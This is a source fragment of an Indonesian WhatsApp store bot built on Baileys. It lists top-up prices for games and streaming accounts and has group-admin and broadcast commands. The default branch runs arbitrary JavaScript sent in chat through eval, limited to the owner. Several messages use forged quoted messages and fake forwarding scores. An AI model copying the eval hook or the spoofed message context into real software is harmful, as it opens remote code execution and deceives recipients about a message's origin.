let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1
let katanya = `Halo kak @${sender.split('@')[0]}  selamat datang di *ITSNION STORE* saya adalah bot whatsapp khusus yang di buat oleh *OWN ITSNION STORE* untuk melakukan topup diamond game online`
const buttons1 = [
  {buttonId: 'command', buttonText: {displayText: 'PRICE LIST'}, type: 1},
  {buttonId: 'codm', buttonText: {displayText: 'OWNER'}, type: 1},
    {buttonId: 'gcstore', buttonText: {displayText: 'GROUP STORE'}, type: 1}
]

const btn1 = {
    contentText: katanya,
    footerText: `${tampilTanggal}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender],
            },
			quoted: fkontak,sendEphemeral: true 
			})
					break
					case 'ff':{
						let dmff =`*[ LIST HARGA DIAMOND FF ]*

70 💎 IDR 10.000
100 💎 IDR 15.000
140 💎 IDR 20.000
150 💎 IDR 22.000
210 💎 IDR 30.000
280 💎 IDR 40.000
300 💎 IDR 42.000
355 💎 IDR 48.000
425 💎 IDR 58.000
520 💎 IDR 70.000
635 💎 IDR 86.000
720 💎 IDR 95.000
1000 💎 IDR 133.000
1125 💎 IDR 150.000

*🎁 MEMBER BULANAN*
*IDR 120.000*

*🎁 MEMBER MINGGUAN*
*IDR 30.000*`
await sendButMessage(from, dmff, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'ml':
	{
		let dmml = `*[ LIST HARGA DIAMOND ML ]*

86 💎 IDR 20.000
172 💎 IDR 40.000
257 💎 IDR 60.000
344 💎 IDR 80.000
429 💎 IDR 100.000
514 💎 IDR 120.000
600 💎 IDR 143.000
706 💎 IDR 160.000
878 💎 IDR 203.000
963 💎 IDR 220.000
1050 💎 IDR 240.000
1222 💎 IDR 285.000

*⭐ STARLIGHT IDR 130.000*

*🌟 STARLIGHT + IDR 300.000*`
await sendButMessage(from, dmml, `${creator}`, [{buttonId: 'format',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'chip':{
		let nsksk = `*[ LIST CHIP MD ( UNGU ) ]*

60M IDR 8.000
200M IDR 20.000
400M IDR 38.000
600M IDR 56.000
1B IDR 72.000
2B IDR 140.000`
	await sendButMessage(from, nsksk, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'codm':{
		let ksksnak = `*[ LIST CP CODM ]*

*26 + 6 IDR 5.500*
*53 + 9 IDR 10.500*
*106 + 21 IDR 20.000*
*264 + 53 IDR 48.000*
*528 + 106 IDR 98.000*
*1056 + 317 IDR 193.000*
*1584 + 475 IDR 290.000*`
	await sendButMessage(from, ksksnak, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'gensing':{
		let ksksnak = `*[ GENSHIN IMPACT ]*

60 🔮
HARGA : 16.000

300 + 30 🔮
HARGA : 68.000

980 + 110 🔮
HARGA : 194.000

1980 + 260 🔮
HARGA : 420.000

3280 + 600 🔮
HARGA : 640.000

6480 + 1600 🔮
HARGA : 1.273.000`
await sendButMessage(from, ksksnak, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
}
break
case 'apk':{
	let ksksnak = `*[ YOUTUBE ]*

❏ 1 BULAN INVITE = 3k
❏ 1 BULAN INDIVIDU = 4k
❏ 1 BULAN ADMIN = 5k
❏ 4 BULAN INDIVIDU = 13k

NB : email dari seller tambah 3k


*[ NETFLIX ]*

❏ 1 BULAN SHARED = 17k

❏ NB : MASA AKTIF RANDOM 25 - 28 H KURANG DARI ITU BISA CLAIM GARANSI SELAMA MEMATUHI S&K

*[ SPOTIFY ]*

❏ 1 BULAN = 14k ( kosong )
❏ 2 BULAN = 22k ( kosong )
❏ 3 BULAN = 28k ( kosong )

*[ DISNEY + HOTSTAR ]*

❏ 1 BULAN SHARED = 17k

*[ WE TV ]*

❏ 1 TAHUN NON GARANSI = 8k
❏ 1 TAHUN FULL GARANSI = 19K

🔖  TANYA STOK DULU YAK 🔖
`
await sendButMessage(from, ksksnak, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
}
break
case 'pb':{
	let ksksnak = `*[ POINT BLANK ]*

❏ 1.200 CASH
HARGA : 12.000

❏ 2.400 CASH
HARGA : 20.000

❏ 6.000 CASH
HARGA : 48.000

❏ 12.000 CASH
HARGA : 93.000
`
await sendButMessage(from, ksksnak, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
}
break
case 'pulsa':{
	let ksksnak = `*[ PULSA INDOSAT ]*

❏ 5.000
HARGA : 6.500

❏ 10.000
HARGA : 10.500

❏ 12.000
HARGA : 12.860

❏ 15.000
HARGA : 15.860

❏ 20.000
HARGA : 20.500

❏ 25.000
HARGA : 25.500

❏ 30.000
HARGA : 30.500

❏ 40.000
HARGA : 40.500

❏ 50.000
HARGA : 50.500
`
await sendButMessage(from, ksksnak, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
}
break
case 'valo':{
	let valo =`*[ LIST POINT VALORANT ]*

❏ 125 POINTS
*HARGA : 15.900*

❏ 420 POINTS
*HARGA : 50.000*

❏ 700 POINTS
*HARGA : 82.500*

❏ 1375 POINTS 
*HARGA : 149.500*

❏ 2400 POINTS
*HARGA : 248.000*

❏ 4000 POINTS
*HARGA : 397.000*

❏ 8150 POINTS
*HARGA : 795.000*`
	await sendButMessage(from, valo, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'live':{
let live =`*[ LIST CREDIT LIFE AFTER ]*

❏ 65 CREDITS
*HARGA : 14.500*

❏ 330 CREDITS
*HARGA : 70.000*

❏ 558 CREDITS
*HARGA : 110.000*

❏ 1108 CREDITS
*HARGA : 203.000*

❏ 2268 CREDITS
*HARGA : 402.000*

❏ 3468 CREDITS
*HARGA : 625.000*

❏ 5768 CREDITS
*HARGA : 997.000*

❏ 7768 CREDITS
*HARGA : 1.328.000*`
await sendButMessage(from, live, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'shell':{
let shell =`*[ LIST GARENA SHELL ]*

❏ 33 SHELLS
*HARGA : 10.000*

❏ 66 SHELLS
*HARGA : 20.000*

❏ 165 SHELLS
*HARGA : 50.000*

❏ 330 SHELLS
*HARGA : 95.000*`
await sendButMessage(from, shell, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'koin':{
let koin =`*[ LIST KOIN EMAS ]*

❏ 30M COIN EMAS
*HARGA : 6.000*

❏ 60M COIN EMAS
*HARGA : 10.000*

❏ 100M COIN EMAS
*HARGA : 11.500*

❏ 200M COIN EMAS 
*HARGA : 22.000*

❏ 300M COIN EMAS
*HARGA : 43.000*

❏ 400M COIN EMAS
*HARGA : 53.000*

❏ 1B COIN EMAS
*HARGA : 77.000*`
await sendButMessage(from, koin, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
	case 'nokos':{
let nokos =`*[ LIST NOMER KOSONG ]*

❏ WA VERIF TELP
*HARGA : 400P*

❏ WA VERIF SMS
*HARGA : 650P*

❏ NOKOS ALL APK
*HARGA : 600P*

❏ NOKTEL 
*HARGA : 600 - 800*

❏ E - WALLET
*HARGA : 700P*

❏ GMAIL
*HARGA : 700P*

❏ E - COMMERCE
*HARGA : 700P*

❏ NOKOS LINE
*HARGA : 700P*

❏ NOKOS SNACKVIDEO
*HARGA : 700P*

❏ NOKOS TWITTER
*HARGA : 700P*

❏ NOKOS TIKTOK
*HARGA : 700P*

❏ NOKOS INSTAGRAM
*HARGA : 700P*`
await sendButMessage(from, nokos, `${creator}`, [{buttonId: 'formatt',buttonText: {displayText: `FORMAT`,},type: 1,},{buttonId: 'bayar',buttonText: {displayText: `BAYAR`,},type: 1,}], {quoted: mek})
	}
	break
					case 'command':{
					const rows1 = [{
				"title": `FREE FIRE`,
				"rowId": "ff"
			},
			{
				"title": `CHIP MD ( UNGU )`,
				"rowId": "chip"
			},
			{
				"title": `MOBILE LEGENDS`,
				"rowId": "ml"
			},
			{
				"title": `CODM`,
				"rowId": "codm"
			},
			{
				"title": `GENSHIN IMPACT`,
				"rowId": "gensing"
			},
			{
				"title": `APK PREMIUM`,
				"rowId": "apk"
			},
			{
				"title": `POINT BLANK`,
				"rowId": "pb"
			},
			{
				"title": `PULSA`,
				"rowId": "pulsa"
			},
			{
				"title": `VALORANT`,
				"rowId": "valo"
			},
			{
				"title": `CREDIT LIFE AFTER`,
				"rowId": "live"
			},
			{
				"title": `GARENA SHELL`,
				"rowId": "shell"
			},
			{
				"title": `KOIN EMAS`,
				"rowId": "koin"
			},
			{
				"title": `NOKOS`,
				"rowId": "nokos"
			}

]
		
	const sections1 = [{title: "SILAHKAN DI PILIH", rows: rows1}]
const listt1 = {
 buttonText: 'SELECT HERE',
 title: `PRICE LIST STORE`,
 description: `Halo ${pushname} 😊 selamat datang di store kami.`,
 footerText: `${setting.cr}`,
 sections: sections1,
 listType: 1
}

alpha.sendMessage(from, listt1, MessageType.listMessage,{quoted:mek})
}
break
case 'gcstore':
reply('https://chat.whatsapp.com/DmY1GMNG0IwJPgFGsj3eqA')
break
case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: Mimetype.gif,quoted : ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break     
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/

        
        case 'owner':  
        case 'creator':  
                    members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard2 = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${setting.ownername}\n`
		            + `ORG: SUBSCRIBE ZEEONE OFC;\n`
		            + `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${setting.ownername}`, vcard: vcard2}, contact, { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
		           .then((res) => alpha.sendMessage(from, 'Nih kontak ownerku', text, {quoted: mek}))
                break
		 case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		            offline = false
		            fakeitem(' ```ANDA TELAH ONLINE``` ')
		            break       
		  case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(' ```ANDA TELAH OFFLINE``` ')
		            break   
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		          	if (banChats === false) return
		          	banChats = false
		          	fakeitem(`「 *PUBLIC-MODE* 」`)
		          	break
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		          	if (banChats === true) return
		          	banChats = true
		          	fakeitem(`「 *SELF-MODE* 」`)
		          	break
		 	case 'hidetag':
		     case '_`':
		     case '.':
		if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
			case 'setname':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					if (!isGroupAdmins && !isBotGroupAdmins) return fakegroup('```ONLY ADMIN LORD```')
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '  SUKSES  Mengubah Nama Grup my', text, { quoted: mek })
					break 
case 'setdesc':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					if (!isGroupAdmins) return fakegroup('```ONLY ADMIN LORD```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*  SUKSES  Mengubah Desk Grup', text, { quoted: mek })
					break   
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('```Masukkan text```')
					ini_bc = args.join(' ')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmediaa)
					for (let _ of anu) {
					alpha.sendMessage(_.jid, bc, image, {quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${ini_bc}`})
					}
					fakegroup('```SUKSESS BROADCAST```')
					} else {
					for (let _ of anu) {
						alpha.sendMessage(_.jid, `*BROADCAST* \n\n${ini_bc}`, text, { contextInfo: { mentionedJid: [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
					 //sendMess(_.jid, `*「 Alphabot Broadcast  」*\n\n${body.slice(4)}`)
					}
					fakegroup('```SUKSESS BROADCAST```')
					}
					break
					case 'group': 
   case 'gc': case 'grup':
                if (!isGroup) return reply(lang.onlygc());
        if (!isGroupAdmins && !isBotGroupAdmins) return reply(lang.onlygcAdmin());
        if (args[0] == "open") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					reply('S U C C E S S  O P E N I N G  G R O U P')
        } else if (args[0] == "close") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					reply('S U C C E S S  C L O S I N G  G R O U P')
        } else if (!q) {
        	reply(`Penggunaan .group close/open`)
        }
        break
			case 'd': case 'done':
			apanih = `「 *PESANAN SELESAI* 」\n\nNama : ${pushname}\nNomor : ${sender.split('@')[0]}\nHari : ${tampilTanggal}\nWaktu : ${tampilWaktu}\nStatus : Pesanan Selesai.\n\nTerimakasih atas pesanannya, kami tunggu pesanan berikutnya 😊`
			alpha.sendMessage(from, apanih, text, {quoted : ftoko, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
			break
			case 'p': case 'proses':
			apanih = `「 *PESANAN DIPROSES* 」\n\nNama : ${pushname}\nNomor : ${sender.split('@')[0]}\nHari : ${tampilTanggal}\nWaktu : ${tampilWaktu}\nStatus : Pesanan sedang di proses!!!\n\nSetelah pesanan selesai ketik ${prefix}done yang menandakan bahwa pesanan telah telesai 🐣`
			alpha.sendMessage(from, apanih, text, {quoted : ftoko, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
			break
			
           case 'antilink':
              if (!isGroup) return reply('only gc')
              if (!isBotGroupAdmins && !isGroupAdmins) return reply('khusus admin')
              if (args[1] === 'on'){
              if (isAntiLink) return reply('udh on')
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply('```[ ✓ ]```Antilink di aktifkan')
              } else if (args[1] === 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply('```[ ✓ ]```Antilink di nonaktifkan')
              } else if (!q) {
              	reply('pilih on / off')
              }
          case 'add':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} 629xxxx*`)
orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
alpha.sendMessage(from, `Mengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendGroupV4Invite(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
break

case 'radd':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (sen.message.extendedTextMessage === undefined || sen.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!`)
break

case 'rkick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break
				default:
				
				
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}


	
    
